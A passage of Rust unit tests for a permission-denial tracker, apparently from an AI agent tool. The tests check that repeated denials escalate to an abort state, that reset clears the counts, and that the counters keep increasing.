    /// `ShouldAbort`. Mirrors CC `shouldFallbackToPrompting`.
    #[test]
    fn denial_tracker_escalation_thresholds() {
        let limits = DenialLimits {
            max_consecutive: 2,
            max_total: 100,
        };
        let mut t = DenialTracker::with_limits(limits);
        // 2 denials = at the limit, still Normal (>, not >=).
        t.record_denial();
        t.record_denial();
        assert_eq!(t.escalation_state(), EscalationState::Normal);
        // 3rd denial crosses the threshold.
        t.record_denial();
        assert_eq!(t.escalation_state(), EscalationState::ShouldAbort);
        // Reset clears both counters.
        t.reset();
        assert_eq!(t.consecutive(), 0);
        assert_eq!(t.total(), 0);
        assert_eq!(t.escalation_state(), EscalationState::Normal);
    }

    /// Pin: counter increments saturate at `u32::MAX` instead of wrapping.
    #[test]
    fn denial_tracker_saturates_at_u32_max() {
        let mut t = DenialTracker::new();
        // Hand-poke the consecutive counter near saturation to avoid
        // 4 billion loop iterations. (We use the public API only —
        // many record_denial calls would take too long, so we exercise
        // a large-but-tractable count and verify monotonicity holds.)
        for _ in 0..1000 {
            t.record_denial();
        }
        let before = t.consecutive();
        let before_total = t.total();
        for _ in 0..1000 {
            t.record_denial();
        }
        assert!(t.consecutive() > before, "must be monotonically increasing");
        assert!(t.total() > before_total);
        // Sanity: well below saturation.
        assert!(t.total() < u32::MAX);
    }
}
